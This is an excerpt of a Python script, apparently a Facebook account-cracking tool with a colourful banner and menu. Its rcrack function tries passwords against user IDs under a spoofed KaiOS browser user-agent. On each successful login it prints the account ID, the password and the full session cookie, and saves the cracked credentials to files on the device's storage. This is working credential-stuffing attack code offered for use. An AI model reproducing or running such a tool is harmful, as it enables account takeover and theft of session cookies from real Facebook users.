...
def FD():
    os.system('clear')
    print(logo)
    print('\x1b[1;33m [1] follow my acc')
    print(' [2] EXIT')
...
def o():
    ...
    jalan('\x1b[1;32m [2] \x1b[1;32mCONTACT ME ON FB')
...
\033[1;37m================= \33[32;45mMK\33[0;m =====================
\033[1;32m     \033[1;33mCREATED BY\33[0;m   :  \033[1;33mmk\33[0;m\033[1;32m && \033[1;33mmurshad\33[0;m
\033[1;32m     \033[1;32mFACEBOK      : \033[1;34m MK
\033[1;32m     \033[1;35mGITHUB       :  \033[1;35mmk
\033[1;32m     \033[1;36mTOOL STATUS  :  \033[1;36mTOOL IS FREE
\033[1;32m     \033[1;35mTEAM         :  \033[1;35m Mk
\033[1;32m     \033[1;36mTOOL VIRSION :  \033[1;36m0.1
\033[1;37m================= \33[32;45mMk\33[0;m =====================
 
       \33[37;41m\t WELLCOME TO mk TOOL\33[0;m
...
def rcrack(uid,pwx,tl):
    ...
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('    \033[1;32m(mk-OK🔥)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/mk-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('    \33[1;30m(mk-CP🤕)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/mk-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r     %s[mk] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
